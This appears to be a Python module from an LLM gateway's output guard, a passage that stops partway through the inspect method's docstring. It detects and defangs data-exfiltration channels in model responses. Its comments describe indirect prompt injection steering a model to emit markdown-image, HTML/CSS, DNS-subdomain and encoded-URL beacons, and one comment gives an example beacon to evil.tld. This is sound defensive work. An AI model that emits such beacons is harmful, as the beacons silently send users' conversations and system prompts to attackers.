"""
Output Guard -- generator-level output guardrails for the gateway.

Orchestrates all output inspection checks:
1. PII/secret detection (delegated to InputScanner)
2. Hallucination risk scoring (pattern + grounding + contradiction)
3. IP/infrastructure leakage
4. Credential exposure
5. Semantic leakage detection (optional, via SemanticLeakageDetector)

Returns the highest-severity OutputVerdict across all checks.
Action precedence: block(4) > redact(3) > rewrite(2) > flag(1) > allow(0).
"""
from __future__ import annotations

import base64
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from scanner import InputScanner

try:
    from .patterns import (
        detect_credential_exposure,
        detect_hallucination_markers,
        detect_ip_leakage,
        detect_pii,
        detect_secrets,
        get_compliance_tags,
        is_safety_refusal_output,
        redact_all,
        _iter_transport_decodes,
        canonicalize_for_detection,
    )
except ImportError:
    from patterns import (
        detect_credential_exposure,
        detect_hallucination_markers,
        detect_ip_leakage,
        detect_pii,
        detect_secrets,
        get_compliance_tags,
        is_safety_refusal_output,
        redact_all,
        _iter_transport_decodes,
        canonicalize_for_detection,
    )

LOG = logging.getLogger("gateway.output_guard")

ACTION_PRIORITY = {"allow": 0, "flag": 1, "rewrite": 2, "redact": 3, "block": 4}

# Per-detector output actions an operator may configure. Anything outside this
# set falls back to the detector's default action.
_VALID_OUTPUT_ACTIONS = frozenset({"block", "redact", "rewrite", "flag", "allow"})

# C-1: output-threat categories that are SURGICALLY REDACTED-and-served (200),
# never whole-response blocked. The tier-2 guard model emits pci (card numbers)
# and phi (health info) as categories distinct from pii — all are redactable, so
# a benign answer incidentally containing a card/MRN must be masked-in-place, not
# 403'd. (jailbreak/injection/hallucination/ip_leakage stay blockable.)
_REDACTABLE_OUTPUT_CATEGORIES = frozenset({"pii", "pci", "phi", "secret", "credential"})

# ── G13: output-side data-exfiltration channel neutralization ───────────────────
# A model steered by indirect injection can embed its answer with an auto-rendering
# markdown IMAGE (or a link / bare URL) that points at an attacker-controlled host
# and smuggles data in the URL path/query/fragment:
#     ![loading](https://evil.tld/log?d=<base64 of the conversation / system prompt>)
# When the client renders the markdown, the browser silently GETs the URL — a
# ZERO-CLICK exfiltration of whatever was encoded, EVEN WHEN the payload is not
# PII-shaped (so the PII/secret/credential detectors never fire). This is Insecure
# Output Handling (OWASP LLM02 / LLM05). The output guard neutralizes the channel:
# it defangs the auto-render (image -> plain link) and masks the smuggled payload,
# delivering the rest of the answer intact (surgical redact, never whole-block).
# G43: scheme is OPTIONAL — a PROTOCOL-RELATIVE url (``//evil.com/…``) auto-fetches
# with the page's own scheme, so it is just as exfil-capable and must match everywhere.
_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\(\s*<?((?:https?:)?//[^)\s<>]+)>?\s*\)", re.IGNORECASE)
_MD_LINK_RE = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?((?:https?:)?//[^)\s<>]+)>?\s*\)", re.IGNORECASE)
_BARE_URL_RE = re.compile(r"(?<![\]\(\[])https?://[^\s)<>\[\]]+", re.IGNORECASE)
# G43: bare PROTOCOL-RELATIVE url in prose. Stricter than the absolute bare form to keep
# FP low: requires a DOTTED host AND a path/query (so ``a//b`` math, ``//localhost`` and a
# bare ``//host`` with no path do not match), and is gated by _url_smuggles_data
# (defangs only on a sensitive payload), so benign ``//cdn.example`` text is untouched.
_BARE_PROTOREL_RE = re.compile(
    r"(?<![\w/:.])//[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}/[^\s)<>\[\]]+", re.IGNORECASE
)
# G41: HTML/SVG/CSS ZERO-CLICK auto-render beacons. A model steered by indirect
# injection can emit raw HTML/CSS that a client renderer auto-fetches (exfil) even when
# markdown images are sanitized — and the markdown-only defense above misses them (an
# <img> src is only a "bare URL" to the scanner, which trips solely on a PII payload, so
# an ARBITRARY-data HTML beacon rode out un-neutralized). These match the zero-click
# media attributes (src/srcset/poster/data on img/iframe/video/audio/source/embed/object),
# SVG <image|use href>, and CSS url(...). Each captures the URL as group(1). Every
# quantifier is a bounded/greedy negated char class ([^"'>\s]+) or a bounded {0,200} —
# no nested/ambiguous repetition, so they are LINEAR-time (ReDoS-safe).
# Single-URL zero-click media attributes (auto-fetch): src on img/iframe/video/audio/
# source/embed/track, <object data>, <video poster>, plus <form action|formaction> and
# the deprecated background=/cite=. Each captures the URL as group(1).
_HTML_ATTR_RE = re.compile(
    r'\b(?:src|poster|data|action|formaction|background|cite)\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)',
    re.IGNORECASE,
)
# G42: href that AUTO-fetches or hijacks resolution — <link href> (preload/prefetch/
# dns-prefetch/stylesheet/preconnect), SVG <image|use href>, <base href>. One-click
# <a>/<area href> are deliberately NOT matched (handled as links, not zero-click).
_HTML_HREF_RE = re.compile(
    r'<\s*(?:link|image|use|base)\b[^>]{0,300}?\bhref\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)',
    re.IGNORECASE,
)
# G42: <meta http-equiv="refresh" content="0;url=..."> zero-click auto-navigation.
_HTML_META_URL_RE = re.compile(
    r'<\s*meta\b[^>]{0,300}?\burl\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)', re.IGNORECASE,
)
_CSS_URL_RE = re.compile(r'url\(\s*["\']?\s*((?:https?:)?//[^"\')\s]+)', re.IGNORECASE)
# G42: srcset carries MULTIPLE comma-separated "URL [descriptor]" candidates — G41's
# single-URL capture defanged only the first, leaking the rest. Handle the whole value.
_HTML_SRCSET_RE = re.compile(r'\bsrcset\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
_SRCSET_URL_RE = re.compile(r'(?:https?:)?//[^\s,]+')
# A real responsive srcset is short; beyond this a value is pathological -> fail closed.
_SRCSET_MAX_LEN = 4096
_HTML_BEACON_RES = (_HTML_ATTR_RE, _HTML_HREF_RE, _HTML_META_URL_RE, _CSS_URL_RE)
# Cap the number of URLs inspected per output so a pathological response with
# thousands of links cannot make neutralization super-linear. G49: raised from 256 —
# a legitimate single answer virtually never has this many DISTINCT URLs, and when the
# budget IS exhausted _scan_exfil_channels emits a sentinel so _check_exfil_channel
# fails CLOSED (block) instead of silently allowing a beacon hidden past the cap.
_MAX_EXFIL_URLS = 1024
# Sentinel finding kind yielded when the URL budget is exhausted (see G49).
_EXFIL_BUDGET_SENTINEL = "__budget_exhausted__"


def _url_tail(url: str) -> str:
    """The exfil-bearing portion of a URL: path + query + fragment (scheme+host dropped).

    G43: the scheme is OPTIONAL — a PROTOCOL-RELATIVE url (``//evil.com/log?d=…``)
    auto-fetches using the page's own scheme, so it is just as exfil-capable as an
    absolute one and must be recognised here too."""
    m = re.match(r"(?:https?:)?//[^/?#]*(.*)", url, re.IGNORECASE)
    return m.group(1) if m else ""


def _url_host_prefix(url: str) -> str:
    """``[scheme:]//host`` prefix of ``url`` (everything before path/query/fragment).
    G43: scheme optional so protocol-relative hosts are handled."""
    m = re.match(r"((?:https?:)?//[^/?#]*)", url, re.IGNORECASE)
    return m.group(1) if m else url


# G40: an opaque base64 token far longer than any legitimate URL signature
# (AWS SigV4 <=344, tracking ids <=64) that the shared decoder SKIPS because its
# plaintext exceeds _MAX_DECODE_BYTES (4096) — a large data-smuggling blob (whole
# conversation / system prompt) in an image beacon. Bounded to opaque tokens >=512
# chars so real signatures/tracking tokens never match.
_OVERSIZED_B64_RE = re.compile(r"[A-Za-z0-9+/]{512,}={0,2}")
# base64 chars that decode to ~4096 bytes (4 chars -> 3 bytes); a bounded prefix
# is enough to classify the blob as encoded-text vs random binary.
_OVERSIZED_DECODE_PREFIX = (4096 // 3) * 4


def _tail_has_oversized_encoded_blob(tail: str) -> bool:
    """True if ``tail`` carries an oversized opaque base64 token whose BOUNDED
    prefix decodes to mostly-printable text — i.e. a data-smuggling blob the
    _MAX_DECODE_BYTES cap otherwise skips. A random binary signature fails the
    printability check, so this stays low-FP; only used as an IMAGE-beacon signal
    (returned as ``encoded_payload``) so long opaque LINK tokens are unaffected."""
    for m in _OVERSIZED_B64_RE.finditer(tail):
        tok = m.group(0)
        prefix = tok[:_OVERSIZED_DECODE_PREFIX]
        try:
            raw = base64.b64decode(prefix + "=" * (-len(prefix) % 4), validate=False)
        except Exception:  # noqa: BLE001 - malformed base64 -> not a blob
            continue
        if not raw:
            continue
        printable = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13)) / len(raw)
        if printable >= 0.85:
            return True
    return False


# G90: a run of >=4 HTML numeric entities in a URL. A browser's HTML parser decodes ``&#NN;`` inside an
# ``<img src>`` / ``<a href>`` attribute (markdown renders to exactly that), so an entity-encoded payload
# in the URL is decoded by the client and exfiltrated. Entities in a URL are unusual (URLs use percent),
# and a bare ``&#anchor`` fragment lacks the digit+``;``, so the >=4-entity gate is low-FP.
_URL_ENTITY_RUN_RE = re.compile(r"(?:&#x[0-9A-Fa-f]{1,6};|&#[0-9]{1,7};){4,}")


def _url_smuggles_data(url: str) -> str:
    """Return a non-empty reason if ``url`` carries a smuggled data payload.

    Two independent signals over the URL tail (path/query/fragment):
      * ``"encoded_payload"`` — an encoded blob that base64/hex-DECODES to
        mostly-printable text (arbitrary-data exfil: conversation, system prompt,
        identifiers). A random hash / HMAC signature decodes to binary and does
        NOT trip this, separating exfil from legit long opaque tokens. G40: an
        oversized blob (plaintext > the decode cap) is also caught via a bounded
        prefix decode so a LARGE image beacon cannot evade defang by size.
      * ``"sensitive_payload"`` — detected PII / secret / credential in the raw or
        decoded tail (plaintext or encoded PII exfil).
    """
    tail = _url_tail(url)
    # G92: DNS-SUBDOMAIN exfil — data smuggled in the HOSTNAME (``https://<hex/base64-blob>.attacker.com/
    # x.png``). When the client auto-fetches the beacon, RESOLVING the host leaks the subdomain to the
    # attacker's authoritative DNS server (classic DNS exfiltration) — the HTTP request itself never needs
    # to succeed. _url_tail DROPS scheme+host, so the exfil detector never saw the subdomain: PII-in-host
    # is still caught by the text scan (the value is literal in the output), but ENCODED ARBITRARY data
    # (base64/hex of conversation / system prompt) is not. Fold the host — its subdomain labels, '.'-'-'-'_'
    # segmented so each label is an isolated decode candidate — into the SAME decode+detect analysis.
    _hm = re.match(r"(?:https?:)?//([^/?#]*)", url, re.IGNORECASE)
    host = _hm.group(1).split(":")[0].strip() if _hm else ""
    if not tail and not host:
        return ""
    # A base64 blob smuggled in a PATH segment (…/beacon/<blob>.png) is fused with
    # the surrounding '/' and '.' (both legal in base64/URLs) so it won't decode as
    # one clean token. Also scan a delimiter-split view so each path/query segment
    # is an isolated decode candidate. (The raw tail still covers query blobs that
    # use standard-base64 '/' which the split would otherwise break.)
    segmented = re.sub(r"[/?&=#;,.\s]+", " ", tail)
    host_seg = re.sub(r"[.\-_]+", " ", host)
    decoded_parts: list[str] = []
    # G86: an exfil beacon can interleave zero-width/bidi/format (Cf) chars THROUGH the
    # base64/hex blob in the URL (``?d=W​W​9​1…``). The RAW _iter_transport_decodes token
    # regex breaks on the Cf, so the encoded_payload signal never fired and the auto-render
    # beacon egressed raw — yet the attacker's server strips the (percent-encoded) Cf and
    # decodes the exfiltrated data. Decode over the Cf-stripped + whitespace-collapsed views
    # too (parity with detection's _iter_transport_decodes_canon, G75/G76). detect_* below is
    # already Cf-aware (canonicalizes), so sensitive_payload was covered; only encoded_payload
    # (arbitrary non-PII data: system prompt / conversation) was Cf-blind. Keep the outer-token
    # >=24 gate (low-FP), so use _iter_transport_decodes over each derived source.
    # G92: include the HOST + its '.'-segmented labels as decode sources so a base64/hex-encoded
    # subdomain blob (DNS exfil) is decoded like a query/path blob. The >=24-token gate keeps benign
    # short subdomains (api / cdn / www) out; a random hash subdomain decodes to binary and fails the
    # printable check inside _iter_transport_decodes, so only a real readable-data blob trips it.
    _base_sources = [s for s in (tail, segmented, host, host_seg) if s]
    _sources = list(_base_sources)
    for _b in _base_sources:
        _c = canonicalize_for_detection(_b)
        if _c != _b and _c not in _sources:
            _sources.append(_c)
        _w = re.sub(r"\s+", "", _b)
        if _w != _b and _w not in _sources:
            _sources.append(_w)
    for src in _sources:
        for tok, dec in _iter_transport_decodes(src):
            if len(tok) >= 24 and len(dec) >= 8:
                decoded_parts.append(dec)
    # G89: URLs NATIVELY percent-encode data, so a PII/secret/credential payload smuggled as %XX
    # (`?d=%31%32%33-...`) — which the receiving server transparently percent-decodes back to the raw
    # value — evaded the sensitive_payload signal: detect_* canonicalize but do NOT percent-decode, and
    # the base64/hex decoded_parts don't cover percent. Percent-decode the tail (and the Cf-stripped
    # view) into the probe so the raw PII/secret is seen. Decode-gated by detect_* below, so benign URL
    # escapes (`%2F`->'/', `%20`->' ') that decode to non-PII are untouched.
    _pct_views: list[str] = []
    for _p in (tail, canonicalize_for_detection(tail)):
        try:
            _pd = urllib.parse.unquote(_p)
        except Exception:  # noqa: BLE001 - decode must never break the exfil scan
            continue
        if _pd and _pd != _p:
            _pct_views.append(_pd)
    # G90: a browser's HTML parser decodes ``&#NN;`` entities in an ``<img src>`` / ``<a href>``
    # attribute (markdown renders to that), so an entity-encoded PII/secret/arbitrary-data payload in
    # the URL is decoded by the client and exfiltrated. detect_* do NOT decode entities and the
    # base64/hex/percent decoders don't cover them. Decode entity runs into the probe
    # (sensitive_payload), and treat a substantial entity run decoding to printable text as an
    # encoded_payload (arbitrary-data exfil, symmetric to the base64 signal). Entities in URLs are
    # unusual (URLs use percent) -> low FP; the >=4-entity gate excludes a stray ``&#anchor``.
    _ent_views: list[str] = []
    _ent_encoded = False
    if "&#" in tail:
        for _e in (tail, canonicalize_for_detection(tail)):
            _ed = _decode_encoded_run(_e)
            if _ed and _ed != _e:
                _ent_views.append(_ed)
        for _m in _URL_ENTITY_RUN_RE.finditer(tail):
            _dec = _decode_encoded_run(_m.group(0))
            if (_dec != _m.group(0) and len(_dec) >= 8
                    and sum(1 for _c in _dec if _c.isprintable()) / max(1, len(_dec)) >= 0.8):
                _ent_encoded = True
                break
    probe = (
        tail + "\n" + segmented
        + (("\n" + host + "\n" + host_seg) if host else "")  # G92: PII/secret in the subdomain
        + (("\n" + "\n".join(decoded_parts)) if decoded_parts else "")
        + (("\n" + "\n".join(_pct_views)) if _pct_views else "")
        + (("\n" + "\n".join(_ent_views)) if _ent_views else "")
    )
    if detect_pii(probe) or detect_secrets(probe) or detect_credential_exposure(probe):
        return "sensitive_payload"
    if decoded_parts or _ent_encoded:
        return "encoded_payload"
    # G40: fallback for an oversized opaque blob the decode-byte cap skipped. Scan
    # BOTH the raw tail (query blobs) AND the delimiter-split view (so a PATH-segment
    # blob fused with surrounding '/' and '.' is isolated and base64-aligned). G86: also
    # the Cf-stripped canonical views so an oversized Cf-interleaved blob is not missed.
    _c_tail, _c_seg = canonicalize_for_detection(tail), canonicalize_for_detection(segmented)
    if (_tail_has_oversized_encoded_blob(tail) or _tail_has_oversized_encoded_blob(segmented)
            or (_c_tail != tail and _tail_has_oversized_encoded_blob(_c_tail))
            or (_c_seg != segmented and _tail_has_oversized_encoded_blob(_c_seg))):
        return "encoded_payload"
    return ""


def _scan_exfil_channels(text: str):
    """Yield ``(kind, url, reason)`` for each data-exfiltration channel in ``text``.

    ``kind`` is ``"image"`` (zero-click auto-render), ``"link"`` (one-click) or
    ``"bare"``. Images trip on EITHER signal (zero-click, and answer images are
    static assets so an opaque data payload is the beacon signature — low FP).
    Links / bare URLs trip ONLY on the stronger ``"sensitive_payload"`` signal:
    they legitimately carry long opaque tokens (presigned / tracking URLs), so an
    encoded-blob-alone would false-positive.
    """
    # G43: gate on "//" so protocol-relative beacons (no http/https scheme) are scanned.
    if not text or "//" not in text:
        return
    seen: set[tuple[str, str]] = set()
    budget = _MAX_EXFIL_URLS
    # G41: "html" is a zero-click auto-render class (like "image") — trips on EITHER
    # signal. url is group(1) for html beacons, group(2) for md image/link, whole
    # match for bare.
    passes = (
        ("image", _MD_IMAGE_RE), ("link", _MD_LINK_RE), ("bare", _BARE_URL_RE),
        ("bare", _BARE_PROTOREL_RE),
        ("html", _HTML_ATTR_RE), ("html", _HTML_HREF_RE), ("html", _HTML_META_URL_RE),
        ("html", _CSS_URL_RE),
    )
    # G42: srcset can carry several comma-separated source URLs — yield each smuggling one.
    for sm in _HTML_SRCSET_RE.finditer(text):
        for um in _SRCSET_URL_RE.finditer(sm.group(1)):
            if budget <= 0:
                yield _EXFIL_BUDGET_SENTINEL, "", "url_budget_exhausted"  # G49
                return
            budget -= 1
            u = um.group(0).strip().rstrip(").,'\"")
            if _url_smuggles_data(u) and ("html", u) not in seen:
                seen.add(("html", u))
                yield "html", u, _url_smuggles_data(u)
    for kind, regex in passes:
        for m in regex.finditer(text):
            if budget <= 0:
                yield _EXFIL_BUDGET_SENTINEL, "", "url_budget_exhausted"  # G49
                return
            budget -= 1
            if kind in ("image", "link"):
                url = m.group(2)
            elif kind == "html":
                url = m.group(1)
            else:  # bare
                url = m.group(0)
            url = url.strip().rstrip(").,'\"")
            reason = _url_smuggles_data(url)
            if not reason:
                continue
            if kind not in ("image", "html") and reason != "sensitive_payload":
                continue
            key = (kind, url)
            if key in seen:
                continue
            seen.add(key)
            yield kind, url, reason


def neutralize_exfil_channels(text: str) -> str:
    """Defang output-side data-exfiltration channels: mask the smuggled payload and
    stop the zero-click auto-render (image -> plain link). Strict no-op on benign
    markdown / URLs (only constructs that trip :func:`_url_smuggles_data` change)."""
    # G43: gate on "//" so protocol-relative beacons (no http/https scheme) are handled.
    if not text or "//" not in text:
        return text

    def _defang(url: str) -> str:
        raw = url.strip().rstrip(").,'\"")
        # G92: DNS-subdomain exfil — when the HOST itself carries the smuggled payload
        # (``https://<hex/base64-blob>.attacker.com/…``), preserving the host prefix would still leak
        # it on DNS resolution (the HTTP request need not even succeed), so redact the ENTIRE reference
        # rather than only the path/query. Otherwise keep the host prefix (transparency: the user still
        # sees WHERE a tail-exfil beacon pointed).
        _hm = re.match(r"(?:https?:)?//([^/?#]*)", raw, re.IGNORECASE)
        _h = _hm.group(1).split(":")[0].strip() if _hm else ""
        if _h and _url_smuggles_data("//" + _h):
            return "[exfil-redacted]"
        return f"{_url_host_prefix(raw)}/[exfil-redacted]"

    def _img_sub(m: "re.Match[str]") -> str:
        url = m.group(2).strip().rstrip(").,'\"")
        if _url_smuggles_data(url):  # image trips on either signal
            return f"[{m.group(1)}]({_defang(url)})"  # drop leading '!' -> no auto-render
        return m.group(0)

    def _link_sub(m: "re.Match[str]") -> str:
        url = m.group(2).strip().rstrip(").,'\"")
        if _url_smuggles_data(url) == "sensitive_payload":
            return f"[{m.group(1)}]({_defang(url)})"
        return m.group(0)

    def _bare_sub(m: "re.Match[str]") -> str:
        url = m.group(0).strip().rstrip(").,'\"")
        if _url_smuggles_data(url) == "sensitive_payload":
            return _defang(url)
        return m.group(0)

    def _html_sub(m: "re.Match[str]") -> str:
        # G41: zero-click HTML/CSS beacon — trip on EITHER signal (like an image). Replace
        # the whole URL (not just the payload) with the marker so no scheme/host/payload
        # remains: the tag can no longer auto-fetch the attacker AND carries no data.
        url = m.group(1).strip().rstrip(").,'\"")
        if _url_smuggles_data(url):
            return m.group(0).replace(m.group(1), "[exfil-redacted]", 1)
        return m.group(0)

    def _srcset_sub(m: "re.Match[str]") -> str:
        # G42: defang EVERY smuggling URL inside a (possibly multi-source) srcset value.
        value = m.group(1)
        # DoS bound: a legit responsive srcset is short (a handful of sizes). A
        # pathologically long value (hundreds of URLs) would make the per-URL
        # _url_smuggles_data scan slow, so fail closed and defang it wholesale.
        if len(value) > _SRCSET_MAX_LEN and ("http://" in value or "https://" in value):
            return m.group(0).replace(value, "[exfil-redacted]", 1)

        def _one(um: "re.Match[str]") -> str:
            u = um.group(0).strip().rstrip(").,'\"")
            return "[exfil-redacted]" if _url_smuggles_data(u) else um.group(0)

        neutralized = _SRCSET_URL_RE.sub(_one, value)
        return m.group(0).replace(value, neutralized, 1) if neutralized != value else m.group(0)

    # G41/G42: neutralize HTML/SVG/CSS zero-click beacons FIRST so the URL is gone before
    # the bare-URL pass (which would otherwise only strip a PII payload and leave the tag's
    # auto-render intact). Strict no-op on benign media (gated by _url_smuggles_data).
    out = _HTML_SRCSET_RE.sub(_srcset_sub, text)
    for _re in _HTML_BEACON_RES:
        out = _re.sub(_html_sub, out)
    out = _MD_IMAGE_RE.sub(_img_sub, out)
    out = _MD_LINK_RE.sub(_link_sub, out)
    out = _BARE_URL_RE.sub(_bare_sub, out)
    out = _BARE_PROTOREL_RE.sub(_bare_sub, out)  # G43: protocol-relative bare urls
    return out

_STOPWORDS = frozenset({
    "the", "a", "an", "is", "are", "was", "were", "be", "been", "being",
    "have", "has", "had", "do", "does", "did", "will", "would", "could",
    "should", "may", "might", "shall", "can", "to", "of", "in", "for",
    "on", "with", "at", "by", "from", "it", "this", "that", "and", "or",
    "but", "not", "no", "if", "so", "as",
})

# Strong self-contradiction only — bare "however/but" in refusals caused false
# positives. Pattern 3 previously matched bare negation/correction words
# ("not true|incorrect|wrong|mistaken|inaccurate") ANYWHERE, which fired on
# benign corrective prose that debunks an *external* misconception
# ("That is not true. The Earth is a sphere."). It now requires the negation to
# reference the SPEAKER'S OWN earlier assertion (self-reference anchor) so only
# genuine self-contradiction within the same output is scored.
_CONTRADICTION_PATTERNS = [
    re.compile(r"\bcontrary to (?:what I|my)\b", re.IGNORECASE),
    re.compile(
        r"\b(?:actually|in fact),?\s+(?:that|this)\s+(?:is|was)\s+(?:not|incorrect|wrong)\b",
        re.IGNORECASE,
    ),
    re.compile(
        r"\b(?:I (?:said|stated|claimed|mentioned|told you)|"
        r"(?:earlier|previously|above|before) I|my (?:previous|earlier|prior) (?:statement|answer|claim|response))\b"
        r"(?:[^.!?]{0,80})\b(?:not true|incorrect|wrong|mistaken|inaccurate|was wrong|is false)\b",
        re.IGNORECASE,
    ),
]

# Default threshold when no RAG context (pattern noise is higher without grounding).
_NO_CONTEXT_HALLUCINATION_THRESHOLD = 0.45
_RAG_GROUNDED_HALLUCINATION_THRESHOLD = 0.2


def _mask_value_for_detail(value: str, max_len: int = 24) -> str:
    """Mask a raw matched PII/secret value for the client-facing ``detail`` string.

    ``OutputVerdict.detail`` reaches the END CLIENT via zeroshield response
    metadata on redact/block paths, so it must never carry a raw matched value
    (otherwise a just-redacted SSN/email leaks back through metadata).

    ``matched_values`` deliberately keeps the RAW value for the operator
    console (control-plane telemetry); only this human-readable string is
    masked. Prefer :func:`redact_all` for consistency with the tier-2
    evidence path (M-01); if the bare value does not re-match its pattern out
    of context (context-dependent patterns), fall back to a deterministic
    partial mask so a raw value can never slip through.
    """
    raw = str(value)
    if not raw:
        return raw
    masked = redact_all(raw)
    if masked == raw:
        # Pattern did not re-match the bare value — deterministic partial mask.
        masked = raw[:2] + "*" * max(len(raw) - 2, 3)
    return f"{masked[:max_len]}{'…' if len(masked) > max_len else ''}"


# ── G10: typed-placeholder masking of semantically-identified spans ─────────────
# The tier-2 guard model can flag PII/secret content that has NO deterministic regex
# (free-text names, non-standard card/ID layouts, passphrases). ``redact_all`` is a
# no-op on those, so a "redact" verdict egressed the value raw (honestly relabeled to
# "flag" by main.py, but still leaked). We mask the guard model's identified spans
# with a typed placeholder so the redact actually removes the bytes.
_TYPED_PLACEHOLDER = {
    "pii": "[REDACTED_PII]",
    "pci": "[REDACTED_CARD]",
    "phi": "[REDACTED_PHI]",
    "secret": "[REDACTED_SECRET]",
    "credential": "[REDACTED_SECRET]",
}
# Bounds keep span-masking SURGICAL: skip a span too short to be a real value (noise)
# or so long it is a whole sentence (masking it would destroy legit content — the
# guard model is expected to return value-level evidence).
_SPAN_MASK_MIN_LEN = 3
_SPAN_MASK_MAX_LEN = 120


def _typed_placeholder(threat_type: str) -> str:
    return _TYPED_PLACEHOLDER.get(str(threat_type or "").lower(), "[REDACTED]")


# A detector CATEGORY LABEL ("ssn", "email", "aws_access_key") — a lowercase
# snake_case identifier — is NOT a raw sensitive value: it is safe to show in
# evidence and must NOT be masked/used as a redaction span. The tier-2 guard model,
# by contrast, returns RAW evidence fragments (free-text names, card numbers) that
# MUST be masked. Length alone can't tell them apart; the key SHAPE can.
_PATTERN_KEY_RE = re.compile(r"[a-z][a-z0-9_]{1,39}")


def _looks_like_pattern_key(s: str) -> bool:
    return bool(_PATTERN_KEY_RE.fullmatch(s or ""))


def _mask_evidence_span(span: str, threat_type: str) -> str:
    """Client-safe form of a guard-model evidence fragment (G16).

    The tier-2 verdict's ``matched_patterns`` reaches the client via the enforcement
    envelope (main.py) — it must never carry a RAW sensitive value. ``redact_all``
    handles standard PII/secret; a category label stays readable; any remaining
    free-text value (a name / passphrase redact_all has no regex for) is partial-
    masked so it cannot leak the just-redacted value back through metadata."""
    s = str(span)
    r = redact_all(s)
    if r != s:  # standard PII/secret regex masked it
        return r
    if len(s.strip()) < _SPAN_MASK_MIN_LEN or _looks_like_pattern_key(s.strip()):
        return s  # category label / trivial fragment -> keep readable
    return _mask_value_for_detail(s)


def _redaction_spans_from(spans, threat_type: str) -> list[str]:
    """Filter guard-model evidence spans to value-like fragments worth masking, and
    only for redactable categories (so a jailbreak/injection evidence fragment is
    never used to blank out response text). Category labels (pattern keys) are
    excluded — they are not raw values, so they must never blank response text."""
    if str(threat_type or "").lower() not in _REDACTABLE_OUTPUT_CATEGORIES:
        return []
    out: list[str] = []
    for s in spans or []:
        s = str(s).strip()
        if not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
            continue
        if "REDACTED" in s.upper() or _looks_like_pattern_key(s):
            continue
        out.append(s)
    return out


def _mask_spans_typed(text: str, spans, threat_type: str) -> str:
    """Replace each literal ``span`` occurrence in ``text`` with a typed placeholder.

    Literal (no regex) + bounded surgical removal of a semantically-identified value
    the deterministic redactor could not match. Skips a span that alone would mask
    more than ~40% of the response (guards against an over-broad sentence-level
    evidence span). Fails toward redaction: a slightly incidental over-mask is
    preferable to egressing the raw sensitive value."""
    if not text or not spans:
        return text
    try:
        from patterns import contains_smart_redaction_markers as _smart_ok
    except ImportError:  # pragma: no cover
        from .patterns import contains_smart_redaction_markers as _smart_ok
    placeholder = _typed_placeholder(threat_type)
    out = text
    seen: set[str] = set()
    for s in spans:
        s = str(s).strip()
        # The [_SPAN_MASK_MIN_LEN, _SPAN_MASK_MAX_LEN] bound is the only over-mask
        # guard: too-short spans are noise; a span > _SPAN_MASK_MAX_LEN is an over-
        # broad (sentence-level) evidence fragment and is refused. Any value-length
        # span within bounds is masked even if it is a large fraction of a short
        # answer — fail-toward-redaction (a placeholder never "nukes" legit content).
        if s in seen or not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
            continue
        # Already smart-masked (j***@a***.com) — do not replace with [REDACTED_PII].
        if _smart_ok(s):
            continue
        seen.add(s)
        if s in out:
            out = out.replace(s, placeholder)
    return out


@dataclass
class OutputVerdict:
    """Result of output inspection."""

    action: str = "allow"
    threat_type: str = ""
    confidence: float = 0.0
    detail: str = ""
    matched_patterns: list[str] = field(default_factory=list)
    matched_values: dict[str, str] = field(default_factory=dict)
    compliance_tags: list[str] = field(default_factory=list)
    # G10: RAW sensitive spans the tier-2 guard model identified SEMANTICALLY (free-
    # text names, non-standard card/ID layouts, passphrases) that ``redact_all`` has
    # no deterministic regex for. The sanitizer masks these with a typed placeholder
    # so a semantic redact verdict actually removes the bytes instead of being a
    # no-op that egresses raw. Kept OFF the client-facing telemetry surface (never
    # serialized by output_guard_telemetry_meta) so the raw span stays internal.
    redaction_spans: list[str] = field(default_factory=list)
    # M11: True when the tier-2 OUTPUT guard model could not scan (outage /
    # breaker-open / parse failure) and the response was passed UNSCANNED
    # (fail-open). Surfaced to telemetry + the client zeroshield metadata so a
    # guard outage is VISIBLE, not silent.
    scan_degraded: bool = False


@dataclass
class HallucinationScore:
    """Numeric hallucination risk assessment."""

    risk_score: float = 0.0
    pattern_score: float = 0.0
    grounding_score: float = 0.0
    contradiction_score: float = 0.0
    matched_markers: list[str] = field(default_factory=list)
    detail: str = ""


def normalize_output_scan_text(text: str) -> str:
    """Return model-generated text suitable for OUTPUT-guard scanning.

    Whitespace-only completions are treated as empty (L7): the guard must not
    run PII/secret checks when the model produced no substantive output bytes.
    Non-empty text is returned unchanged (internal spacing preserved).
    """
    if not text or not isinstance(text, str):
        return ""
    if not text.strip():
        return ""
    return text


class OutputGuard:
    """
    Orchestrates all output inspection checks and returns the
    highest-severity verdict.

    Configuration keys (from gateway config dict):
    - output_guard_enabled: master toggle
    - output_block_on_credential: block on credential exposure (default True)
    - output_block_on_ip_leakage: block on IP leakage (default False, flag only)
    - hallucination_flag_enabled: flag hallucination markers (default True)
    """

    def __init__(self, scanner: "InputScanner", config: dict | None = None) -> None:
        self._scanner = scanner
        self._config = config or {}
        self._leakage_detector = None
        self._grounding_guard = None  # type: ignore[assignment]

    def set_leakage_detector(self, detector) -> None:
        """Attach an optional SemanticLeakageDetector."""
        self._leakage_detector = detector

    def set_grounding_guard(self, guard) -> None:
        """Attach an optional :class:`rag_pipeline.grounding_guard.GroundingGuard`.

        When attached, the ``hallucination_grounding_mode`` org-config field
        (per migration 0022) selects the algorithm used to compute the
        ``grounding_score`` component of the hallucination risk:

        * ``"lexical"`` (default) — existing Jaccard token-overlap, no
          embeddings used. Preserves legacy behavior.
        * ``"semantic"`` — max Bedrock Titan v2 cosine similarity (fail-open
          to lexical if the embedder is unavailable / circuit OPEN).
        * ``"hybrid"`` — mean of lexical and semantic (fail-open to lexical
          on embedder failure).
        """
        self._grounding_guard = guard

    async def inspect(
        self,
        text: str,
        context_chunks: list[str] | None = None,
        *,
        org_config: dict | None = None,
        org_slug: str = "",
    ) -> OutputVerdict:
        """
        Run all output checks. Returns the combined highest-severity verdict.

        Checks are run in order:
        1. PII/secret (via scanner) -> redact
        2. Credential exposure -> block or redact
